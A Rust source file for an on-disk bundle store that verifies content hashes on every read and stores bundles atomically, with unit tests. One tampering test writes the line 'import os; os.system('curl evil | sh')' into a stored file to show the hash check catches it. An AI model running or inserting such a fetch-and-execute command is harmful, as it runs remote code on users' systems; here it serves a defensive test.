use std::io;
use std::path::{Path, PathBuf};

use moil_proto::BundleHash;

use crate::{Bundle, BundleError, LoadError};

/// Bundles on disk, one directory per hash. The directory for a hash always
/// holds exactly that bundle: [`BundleStore::get`] re-checks the hash on
/// every read, and [`BundleStore::put`] never leaves a partial directory.
#[derive(Debug, Clone)]
pub struct BundleStore {
    root: PathBuf,
}

impl BundleStore {
    pub fn new(root: impl Into<PathBuf>) -> Self {
        Self { root: root.into() }
    }

    pub fn root(&self) -> &Path {
        &self.root
    }

    /// Where the bundle with this hash lives, whether or not it is stored.
    pub fn dir(&self, hash: &BundleHash) -> PathBuf {
        self.root.join(hash.to_string())
    }

    /// Stores `bundle` and returns its directory. Storing a bundle that is
    /// already there is a no-op, so an intact copy that attempts may be
    /// running from is never touched; only a damaged copy is replaced.
    pub fn put(&self, bundle: &Bundle) -> io::Result<PathBuf> {
        let hash = bundle.hash();
        let dir = self.dir(&hash);
        if self.is_intact(&hash) {
            return Ok(dir);
        }
        std::fs::create_dir_all(&self.root)?;
        let staging = tempdir_in(&self.root)?;
        let stored = bundle.write_to(&staging).and_then(|()| {
            // Renaming onto an existing directory fails, so a copy another
            // writer stored meanwhile survives; keep it if it's intact.
            if std::fs::rename(&staging, &dir).is_ok() || self.is_intact(&hash) {
                return Ok(());
            }
            std::fs::remove_dir_all(&dir)?;
            std::fs::rename(&staging, &dir)
        });
        let _ = std::fs::remove_dir_all(&staging);
        stored.map(|()| dir)
    }

    fn is_intact(&self, hash: &BundleHash) -> bool {
        self.get(hash).is_ok_and(|b| b.is_some())
    }

    /// The stored bundle with this hash, or `None` if there is none. Fails if
    /// the stored files no longer hash to `hash`.
    pub fn get(&self, hash: &BundleHash) -> Result<Option<Bundle>, LoadError> {
        let dir = self.dir(hash);
        if !dir.is_dir() {
            return Ok(None);
        }
        let bundle = Bundle::from_dir(&dir)?;
        bundle.verify(hash).map_err(LoadError::Invalid)?;
        Ok(Some(bundle))
    }

    pub fn remove(&self, hash: &BundleHash) -> io::Result<()> {
        match std::fs::remove_dir_all(self.dir(hash)) {
            Err(e) if e.kind() == io::ErrorKind::NotFound => Ok(()),
            other => other,
        }
    }
}

fn tempdir_in(root: &Path) -> io::Result<PathBuf> {
    for attempt in 0..100u32 {
        let nanos = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.subsec_nanos())
            .unwrap_or(0);
        let path = root.join(format!(".staging-{}-{nanos}-{attempt}", std::process::id()));
        match std::fs::create_dir(&path) {
            Ok(()) => return Ok(path),
            Err(e) if e.kind() == io::ErrorKind::AlreadyExists => continue,
            Err(e) => return Err(e),
        }
    }
    Err(io::Error::other("couldn't create a staging directory"))
}

impl From<BundleError> for io::Error {
    fn from(e: BundleError) -> Self {
        io::Error::new(io::ErrorKind::InvalidData, e)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn minimal() -> Bundle {
        Bundle::from_dir(concat!(
            env!("CARGO_MANIFEST_DIR"),
            "/../../spec/vectors/bundles/minimal"
        ))
        .unwrap()
    }

    #[test]
    fn put_then_get() {
        let root = tempfile::tempdir().unwrap();
        let store = BundleStore::new(root.path());
        let bundle = minimal();
        assert!(store.get(&bundle.hash()).unwrap().is_none());

        let dir = store.put(&bundle).unwrap();
        assert_eq!(dir, root.path().join(bundle.hash().to_string()));
        assert_eq!(store.get(&bundle.hash()).unwrap(), Some(bundle.clone()));
        assert_eq!(store.put(&bundle).unwrap(), dir);

        store.remove(&bundle.hash()).unwrap();
        assert!(store.get(&bundle.hash()).unwrap().is_none());
        store.remove(&bundle.hash()).unwrap();
    }

    #[test]
    fn concurrent_puts_never_remove_a_stored_copy() {
        let root = tempfile::tempdir().unwrap();
        let store = BundleStore::new(root.path());
        let bundle = minimal();
        let dir = store.dir(&bundle.hash());
        std::thread::scope(|scope| {
            for _ in 0..8 {
                scope.spawn(|| {
                    for _ in 0..20 {
                        store.put(&bundle).unwrap();
                        // Once any put returns, the copy stays readable.
                        assert!(dir.join(crate::SCRIPT).is_file());
                    }
                });
            }
        });
        assert_eq!(store.get(&bundle.hash()).unwrap(), Some(bundle));
        assert_eq!(
            std::fs::read_dir(root.path()).unwrap().count(),
            1,
            "no staging left behind"
        );
    }

    #[test]
    fn tampering_is_detected_and_put_repairs_it() {
        let root = tempfile::tempdir().unwrap();
        let store = BundleStore::new(root.path());
        let bundle = minimal();
        let dir = store.put(&bundle).unwrap();

        std::fs::write(
            dir.join("job.py"),
            "import os; os.system('curl evil | sh')\n",
        )
        .unwrap();
        let err = store.get(&bundle.hash()).unwrap_err();
        assert!(
            matches!(err, LoadError::Invalid(BundleError::HashMismatch { .. })),
            "{err}"
        );

        store.put(&bundle).unwrap();
        assert_eq!(store.get(&bundle.hash()).unwrap(), Some(bundle));
        let leftovers: Vec<_> = std::fs::read_dir(root.path()).unwrap().collect();
        assert_eq!(leftovers.len(), 1, "no staging directories left behind");
    }
}
